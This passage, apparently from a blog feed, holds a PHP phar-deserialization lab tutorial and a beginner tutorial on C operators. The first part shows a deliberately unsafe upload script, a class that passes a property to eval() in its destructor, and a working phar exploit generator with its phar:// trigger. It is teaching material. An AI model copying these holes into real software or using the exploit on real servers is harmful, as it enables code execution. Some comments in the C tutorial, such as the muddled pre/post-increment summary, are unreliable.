class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">            <span class="string">&quot;upload/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no file&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload.html（表单）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://192.168.2.130/upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>index.php（需要利用的类）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>在本地构造 pop 链，将生成的 phar.phar 上传到服务器。然后访问 <code>?filename=upload/phar.phar</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">AnyClass</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; output = <span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>; <span class="comment">// 列出当前目录下的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当我们访问 <code>?filename=upload/phar.phar</code> 的时候，发现页面并没有显示什么东西，因为这里需要加一个伪协议来读取这个文件——<code>phar://</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar://upload/phar.phar</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4.png" alt="PHP反序列化-4"></p><br><h2 id="六、框架反序列化"><a href="#六、框架反序列化" class="headerlink" title="六、框架反序列化"></a>六、框架反序列化</h2><h3 id="1、Yii-框架"><a href="#1、Yii-框架" class="headerlink" title="1、Yii 框架"></a>1、Yii 框架</h3><h3 id="2、Laravel-框架"><a href="#2、Laravel-框架" class="headerlink" title="2、Laravel 框架"></a>2、Laravel 框架</h3><h3 id="3、ThinkPHP-框架"><a href="#3、ThinkPHP-框架" class="headerlink" title="3、ThinkPHP 框架"></a>3、ThinkPHP 框架</h3>]]></content>
    
    
    <summary type="html">&lt;p&gt;PHP反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言运算符</title>
    <link href="http://blog.hvvl404.fun/2023/05/07/C/2_C%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <id>http://blog.hvvl404.fun/2023/05/07/C/2_C%E8%BF%90%E7%AE%97%E7%AC%A6/</id>
    <published>2023-05-07T13:40:47.647Z</published>
    <updated>2023-05-07T13:58:59.083Z</updated>
    
    <content type="html"><![CDATA[<p>C语言运算符</p><span id="more"></span><h3 id="四个重要的运算符"><a href="#四个重要的运算符" class="headerlink" title="四个重要的运算符"></a>四个重要的运算符</h3><h4 id="一、除法的注意事项"><a href="#一、除法的注意事项" class="headerlink" title="一、除法的注意事项"></a>一、除法的注意事项</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年9月18号 </span></span><br><span class="line"><span class="comment">目的：除法的注意事项 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">16</span>/<span class="number">5</span>);    <span class="comment">//结果是3，输入的值是整型，输出的值也是整数 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>,<span class="number">16</span>/<span class="number">5.0</span>);   <span class="comment">//结果是3.200000，输入的值中有小数，输出的值也有小数 </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">需要注意的是%d，%lf，%f不要输错了 </span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure><h4 id="二、取余的注意事项"><a href="#二、取余的注意事项" class="headerlink" title="二、取余的注意事项"></a>二、取余的注意事项</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年9月19日</span></span><br><span class="line"><span class="comment">目的：取余的注意事项 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">3</span>%<span class="number">3</span>);      <span class="comment">//结果为0 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">13</span>%<span class="number">-3</span>);    <span class="comment">//结果为1，说明余数符号跟除数无关 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">-13</span>%<span class="number">3</span>);    <span class="comment">//结果为-1，说明余数符号与被除数相同 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">-13</span>%<span class="number">-3</span>);   <span class="comment">//结果为-1 </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="三、十六进制的不同表达方式"><a href="#三、十六进制的不同表达方式" class="headerlink" title="三、十六进制的不同表达方式"></a>三、十六进制的不同表达方式</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年9月18日</span></span><br><span class="line"><span class="comment">作用：测试%x %X %#x %#X输出的结果 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x=<span class="number">47</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x=%x\n&quot;</span>,x);   <span class="comment">//结果是 2f </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x=%X\n&quot;</span>,x);    <span class="comment">//结果是 2F</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x=%#x\n&quot;</span>,x);   <span class="comment">//结果是 0x2f </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x=%#X\n&quot;</span>,x);   <span class="comment">//结果是 0X2F</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="四、逻辑运算符注意事项"><a href="#四、逻辑运算符注意事项" class="headerlink" title="四、逻辑运算符注意事项"></a>四、逻辑运算符注意事项</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间:2021年9月19日</span></span><br><span class="line"><span class="comment">目的：逻辑运算符的注意事项 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> m;</span><br><span class="line">m=(<span class="number">1</span>&gt;<span class="number">2</span>)&amp;&amp;(i=<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;m=%d,i=%d\n&quot;</span>,m,i);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> j=<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">n=(<span class="number">3</span>&gt;<span class="number">2</span>)||(j=<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;n=%d,j=%d\n&quot;</span>,n,j);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&amp;&amp;左侧的表达式为假，右侧的表达式就不会执行</span></span><br><span class="line"><span class="comment">||左侧的表达式为真，右侧的表达式就不会执行</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">C语言对真假的处理</span></span><br><span class="line"><span class="comment">1.真用1表示，假用0表示 </span></span><br><span class="line"><span class="comment">2.非零是真，零是假 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">逻辑用语: </span></span><br><span class="line"><span class="comment">!(非)</span></span><br><span class="line"><span class="comment">!真     假</span></span><br><span class="line"><span class="comment">!假     真 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&amp;&amp;(并且)</span></span><br><span class="line"><span class="comment">真&amp;&amp;真     真</span></span><br><span class="line"><span class="comment">真&amp;&amp;假     假</span></span><br><span class="line"><span class="comment">假&amp;&amp;真     假</span></span><br><span class="line"><span class="comment">假&amp;&amp;假     假</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">||(或) </span></span><br><span class="line"><span class="comment">真||真     真</span></span><br><span class="line"><span class="comment">真||假     真 </span></span><br><span class="line"><span class="comment">假||真     真</span></span><br><span class="line"><span class="comment">假||假     假 </span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure><h4 id="五、赋值运算符注意事项（复合赋值）"><a href="#五、赋值运算符注意事项（复合赋值）" class="headerlink" title="五、赋值运算符注意事项（复合赋值）"></a>五、赋值运算符注意事项（复合赋值）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年9月20日 </span></span><br><span class="line"><span class="comment">目的：赋值运算符的用法及注意事项 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>,a+=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> b=<span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b=%d\n&quot;</span>,b-=<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c=<span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c=%d\n&quot;</span>,c*=<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> d=<span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;d=%d\n&quot;</span>,d/=<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> e=<span class="number">6</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;e=%d\n&quot;</span>,e%=<span class="number">9</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">赋值运算符  +=    -=    *=    /=    %=</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int a=2;</span></span><br><span class="line"><span class="comment">printf(&quot;a=%d\n&quot;,a+=1);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int a=2;</span></span><br><span class="line"><span class="comment">a+=1;</span></span><br><span class="line"><span class="comment">printf(&quot;a=%d\n&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这两个是一样的 </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><br><h3 id="附录的运算符"><a href="#附录的运算符" class="headerlink" title="附录的运算符"></a>附录的运算符</h3><h4 id="一、前自增和后自增"><a href="#一、前自增和后自增" class="headerlink" title="一、前自增和后自增"></a>一、前自增和后自增</h4><p>1、关于学习前自增和后自增的前言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">为什么会出现自增</span><br><span class="line">          代码更精炼</span><br><span class="line">          自增的速度更快</span><br><span class="line"></span><br><span class="line">学习自增要明白的几个问题</span><br><span class="line">1. 我们编程时应该尽量屏蔽掉前自增和后自增的差别</span><br><span class="line">2. 自增表达式最好不要作为一个更大的表达式的一部分来使用</span><br><span class="line">    或者说</span><br><span class="line">    i++和++i单独成一个语句，不要把它作为一个完整复合语句</span><br><span class="line">    的一部分来使用</span><br><span class="line"></span><br><span class="line">如:</span><br><span class="line">      int m= i++ + ++i + i +i++;  //这样写不但是不规范的代码</span><br><span class="line">                                                        而且是不可移植的</span><br></pre></td></tr></table></figure><p>2、前自增和后自增的用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">时间：2021年9月20日 </span><br><span class="line">目的：++和--的作用及用法的不同 </span><br><span class="line">*/ </span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int a;</span><br><span class="line">a=10;</span><br><span class="line"></span><br><span class="line">printf(&quot;++a=%d\n&quot;,++a);     //结果输出值是11，就是说在10的基础上+1，直接进行了运算，然后输出 </span><br><span class="line">printf(&quot;a=%d\n&quot;,a);         //结果是11，对上述的结果进行输出 </span><br><span class="line"></span><br><span class="line">printf(&quot;a++=%d\n&quot;,a++);     //结果输出值同样也是11，但是并没有输出，只进行了运算 </span><br><span class="line">printf(&quot;a=%d\n&quot;,a);         //结果是12，对上述的结果进行了加法运算+1 </span><br><span class="line">    </span><br><span class="line">int b;</span><br><span class="line">b=20;</span><br><span class="line"></span><br><span class="line">printf(&quot;b++=%d\n&quot;,b++);     //结果是20，b只进行了运算，但是并没有输出，所以按原来的数输出 </span><br><span class="line">printf(&quot;b=%d\n&quot;,b);         //结果是21，对上述 进行加法运算的数据 输出 </span><br><span class="line"> </span><br><span class="line">printf(&quot;++b=%d\n&quot;,++b);     //结果是22，对上述的结果进行加法运算并输出 </span><br><span class="line">printf(&quot;b=%d\n&quot;,b);         //结果是22，对上述的结果进行输出 </span><br><span class="line"> </span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">总结：</span><br><span class="line">      ++和--就是在数据的基础上加一或减一</span><br><span class="line">  ++（--）在一个符号前时，它会对数据进行运算并输出运算后的数据</span><br><span class="line">      ++（--）在一个符号后时，它同样也会对数据进行运算，但不会输出运算后的值，而是会原样输出，这时就需要再添加一个语句来输出这个值 </span><br><span class="line">      a++是先运算再赋值（也就是i加一），++a是先赋值再运算</span><br><span class="line">*/ </span><br></pre></td></tr></table></figure><p>3、前自增和后自增的注意事项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">时间：2021年9月29日 </span><br><span class="line">目的：前自增和后自增注意事项 </span><br><span class="line">*/</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">int j=2;</span><br><span class="line">i=(j++,++j,j+2,j-3);   </span><br><span class="line">printf(&quot;%d&quot;,i);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">注意： </span><br><span class="line">j++,++j在编程中没有区别，且赋值给j </span><br><span class="line">j+2没有把值赋给j，所以到j+3时，j的值</span><br><span class="line">还是4，故结果是1 </span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>4、前自增和后自增的比较</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">时间：2021年9月28日 </span><br><span class="line">目的：前自增和后自增的比较 </span><br><span class="line">*/</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int i,j,m,n;</span><br><span class="line">i=j=3;</span><br><span class="line">m=++j;   //m的值为j加1之后的值 </span><br><span class="line">n=i++;   //n的值为i加1之前的值 </span><br><span class="line">printf(&quot;i=%d,j=%d,m=%d,n=%d&quot;,i,j,m,n);  //i和j的值都在原来的基础上加1 </span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">总结：</span><br><span class="line">    前自增整体表达式的值是i加1之后的值 </span><br><span class="line">    后自增整体表达式的值是i加1之前的值 </span><br><span class="line">*/</span><br></pre></td></tr></table></figure><br><h4 id="二、三目运算符"><a href="#二、三目运算符" class="headerlink" title="二、三目运算符"></a>二、三目运算符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">时间：2021年9月29日 </span><br><span class="line">目的：三目运算符_1 </span><br><span class="line">*/ </span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;i);</span><br><span class="line">i=(i&gt;2?5:1);</span><br><span class="line">printf(&quot;%d\n&quot;,i); </span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">上述的表达式 A ? B ：C</span><br><span class="line">等价于 </span><br><span class="line">             if(A)</span><br><span class="line">                B;</span><br><span class="line">             else</span><br><span class="line">    C;  </span><br><span class="line">*/</span><br></pre></td></tr></table></figure><br><h4 id="三、逗号表达式"><a href="#三、逗号表达式" class="headerlink" title="三、逗号表达式"></a>三、逗号表达式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">时间：2021年9月29日 </span><br><span class="line">目的：三目运算符_2 